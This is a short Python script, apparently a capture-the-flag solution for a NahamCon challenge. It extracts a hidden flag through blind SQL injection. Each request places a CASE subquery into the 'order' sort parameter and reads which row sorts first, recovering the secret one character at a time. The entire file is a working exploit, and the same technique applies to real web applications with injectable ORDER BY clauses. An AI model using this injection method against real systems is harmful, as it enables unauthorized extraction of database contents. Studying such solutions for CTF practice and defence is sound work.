from bs4 import BeautifulSoup
import requests

url = "http://challenge.nahamcon.com:31874/"

letters = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "{", "}", "_"]

index = 1
j = 0

flag = ""

while True:
    payload = {"search" : "a", "order" : "(case when (select (substr(flag," + str(index) + ",1)) FROM flag)=\"" + letters[j] + "\" then name else atomic_number END)" }
    res = requests.post(url, data=payload)
    soup = BeautifulSoup(res.content, 'html.parser')
    table = soup.find('tbody')
    result = table.findChildren('tr')[0].find_all('td')[2].getText()
    if result == 'Actinium':
      flag += letters[j]
      print(flag)
      index +=1
      j = 0
    else:
      j += 1
